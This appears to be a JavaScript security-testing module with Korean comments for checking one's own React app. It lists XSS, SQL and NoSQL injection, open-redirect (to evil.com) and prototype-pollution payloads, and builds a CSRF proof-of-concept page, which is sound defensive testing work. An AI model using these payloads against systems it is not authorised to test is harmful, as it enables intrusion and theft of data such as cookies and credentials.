/**
 * React 앱 보안 테스트 유틸리티
 * 자체 앱 테스트용 페이로드 및 헬퍼 함수
 */

// ============================================================
// XSS 테스트 페이로드
// ============================================================

export const XSS_PAYLOADS = {
  // 기본 스크립트 삽입
  basic: [
    '<script>alert("XSS")</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
  ],

  // 이벤트 핸들러 기반
  eventHandler: [
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
  ],

  // 인코딩 우회
  encoded: [
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
  ],

  // JavaScript URL
  jsUrl: [
    'javascript:alert(1)',
    'javascript:alert(document.cookie)',
    'data:text/html,<script>alert(1)</script>',
    'javascript:/*--></title></style></textarea></script><svg onload=alert(1)>//',
  ],

  // 태그 속성 탈출
  attributeEscape: [
    '" onmouseover="alert(1)"',
    "' onmouseover='alert(1)'",
    '"><script>alert(1)</script>',
    "'/><script>alert(1)</script>",
  ],

  // React 특화
  reactSpecific: [
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    '__proto__',
  ],
};

// ============================================================
// SQL Injection 테스트 페이로드
// ============================================================

export const SQL_PAYLOADS = {
  // 기본
  basic: [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' OR '1'='1",
    "1 OR 1=1",
  ],

  // 유니온 기반
  union: [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT username, password FROM users--",
  ],

  // 시간 기반 (Blind)
  timeBased: [
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5)--",
    "'; SELECT SLEEP(5)--",
  ],

  // NoSQL (MongoDB)
  noSQL: [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "sleep(5000)"}',
    '{"$regex": ".*"}',
  ],
};

// ============================================================
// CSRF 테스트 HTML 생성기
// ============================================================

export function generateCSRFTestPage(targetUrl, method, params) {
  const inputs = Object.entries(params)
    .map(([name, value]) => `<input type="hidden" name="${name}" value="${value}" />`)
    .join('\n      ');

  return `
<!DOCTYPE html>
<html>
<head>
  <title>CSRF Test Page</title>
</head>
<body>
  <h1>CSRF Vulnerability Test</h1>
  <p>이 페이지가 타겟 앱에 요청을 보낼 수 있다면 CSRF 취약점이 있습니다.</p>

  <form id="csrf-form" action="${targetUrl}" method="${method}">
    ${inputs}
    <button type="submit">Submit (Manual)</button>
  </form>

  <script>
    // 자동 제출 테스트 (주석 해제하여 사용)
    // document.getElementById('csrf-form').submit();

    // Fetch API 테스트
    async function testWithFetch() {
      try {
        const response = await fetch('${targetUrl}', {
          method: '${method}',
          credentials: 'include',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(${JSON.stringify(params)})
        });
        console.log('Response:', response.status);
        alert('요청 성공 - CSRF 취약점 존재 가능');
      } catch (error) {
        console.log('CORS 또는 다른 보안 정책에 의해 차단됨');
        alert('요청 차단됨 - CORS 보호 확인 필요');
      }
    }
  </script>

  <button onclick="testWithFetch()">Fetch API로 테스트</button>
</body>
</html>
`;
}

// ============================================================
// Open Redirect 테스트 페이로드
// ============================================================

export const OPEN_REDIRECT_PAYLOADS = [
  '//evil.com',
  'https://evil.com',
  '//evil.com/%2F..',
  '/\\evil.com',
  '///evil.com',
  '////evil.com',
  'https://trusted.com@evil.com',
  'https://evil.com?trusted.com',
  'https://evil.com#trusted.com',
  '//evil.com\\@trusted.com',
  '//%0D%0Aevil.com',
  '//evil%E3%80%82com',
];

// ============================================================
// Prototype Pollution 테스트
// ============================================================

export const PROTOTYPE_POLLUTION_PAYLOADS = [
  { '__proto__': { 'isAdmin': true } },
  { 'constructor': { 'prototype': { 'isAdmin': true } } },
  { '__proto__': { 'toString': 'polluted' } },
  JSON.parse('{"__proto__":{"polluted":"yes"}}'),
];

export function testPrototypePollution(mergeFunction) {
  const results = [];

  PROTOTYPE_POLLUTION_PAYLOADS.forEach((payload, index) => {
    // 테스트 전 상태 저장
    const beforeIsAdmin = {}.isAdmin;

    try {
      // 빈 객체에 페이로드 병합
      mergeFunction({}, payload);

      // 새 객체에서 오염 확인
      const afterIsAdmin = {}.isAdmin;

      if (afterIsAdmin !== beforeIsAdmin) {
        results.push({
          payload: index,
          vulnerable: true,
          message: `Payload ${index}: 프로토타입 오염 발생!`,
        });
      } else {
        results.push({
          payload: index,
          vulnerable: false,
          message: `Payload ${index}: 안전`,
        });
      }
    } catch (error) {
      results.push({
        payload: index,
        vulnerable: false,
        message: `Payload ${index}: 에러 발생 (안전) - ${error.message}`,
      });
    }
  });

  return results;
}

// ============================================================
// 보안 헤더 검증
// ============================================================

export async function checkSecurityHeaders(url) {
  try {
    const response = await fetch(url, { method: 'HEAD' });
    const headers = {};

    const securityHeaders = [
      'Content-Security-Policy',
      'X-Content-Type-Options',
      'X-Frame-Options',
      'X-XSS-Protection',
      'Strict-Transport-Security',
      'Referrer-Policy',
      'Permissions-Policy',
    ];

    securityHeaders.forEach(header => {
      headers[header] = {
        present: response.headers.has(header),
        value: response.headers.get(header),
      };
    });

    return headers;
  } catch (error) {
    return { error: error.message };
  }
}

// ============================================================
// 취약점 스캐너 실행 헬퍼
// ============================================================

export function createTestReport(testResults) {
  const report = {
    timestamp: new Date().toISOString(),
    summary: {
      total: testResults.length,
      vulnerable: testResults.filter(r => r.vulnerable).length,
      safe: testResults.filter(r => !r.vulnerable).length,
    },
    details: testResults,
    recommendations: [],
  };

  if (report.summary.vulnerable > 0) {
    report.recommendations.push(
      '취약점이 발견되었습니다. 즉시 수정이 필요합니다.',
      '입력값 검증 및 이스케이프 처리를 추가하세요.',
      'Content Security Policy(CSP) 헤더를 설정하세요.',
    );
  }

  return report;
}

// ============================================================
// 사용 예시
// ============================================================

/*
import { XSS_PAYLOADS, testPrototypePollution, checkSecurityHeaders } from './security-test-utils';

// 1. XSS 테스트
XSS_PAYLOADS.basic.forEach(payload => {
  // 입력 필드에 페이로드 삽입 후 결과 확인
  testInputField(payload);
});

// 2. Prototype Pollution 테스트
const results = testPrototypePollution(yourMergeFunction);
console.log(results);

// 3. 보안 헤더 확인
const headers = await checkSecurityHeaders('https://your-app.com');
console.log(headers);

// 4. CSRF 테스트 페이지 생성
const csrfPage = generateCSRFTestPage(
  'https://your-app.com/api/sensitive-action',
  'POST',
  { amount: '1000', recipient: 'attacker' }
);
// csrfPage를 HTML 파일로 저장 후 브라우저에서 열기
*/
